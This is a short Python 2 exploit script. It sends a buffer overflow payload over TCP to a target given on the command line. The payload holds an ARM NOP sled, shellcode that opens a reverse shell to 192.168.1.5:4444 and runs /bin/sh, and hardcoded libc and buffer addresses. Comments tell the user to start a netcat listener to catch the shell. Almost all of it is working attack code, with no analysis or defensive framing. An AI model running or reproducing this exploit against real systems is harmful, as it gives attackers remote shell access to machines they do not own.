#!/usr/bin/python

import sys, socket


# NoP + tcp reverse shell exploit(192.168.1.5:4444) + libc addr + buffer addr

shellcode = ("\x01\x10\xa0\xe1"*30
+ "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\x20\x01\x21\x52\x40\x64\x27\xb5\x37\x01\xdf\x04\x1c\x0a\xa1\x4a\x70\x10\x22\x02\x37\x01\xdf\x20\x1c\x49\x40\x3f\x27\x01\xdf\x20\x1c\x01\x31\x01\xdf\x20\x1c\x01\x31\x01\xdf\x04\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x02\xaa\x11\x5c\xc0\xa8\x01\x05\x2f\x62\x69\x6e\x2f\x73\x68\x58"
+"\x50\xd0\x02\x00")           # addr of libc(printf) -> $readelf --relocs <binary>

addr = ("\x50\x3a\x03\x00")    # buffer addr



if __name__ == "__main__":
    if len(sys.argv) != 3:
        print "./ho_rev.py  192.168.1.26  5555"
    else:
        sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM,0)
        sock.connect(( sys.argv[1], int(sys.argv[2]) ))
        sock.send(shellcode)
        sock.send(addr)
        sock.close()

        print "Shellcode Length: %d" %len(shellcode)




# Before sending the exploit, Open a tcp server in the following way
# netcat -lpv 192.168.1.5 4444


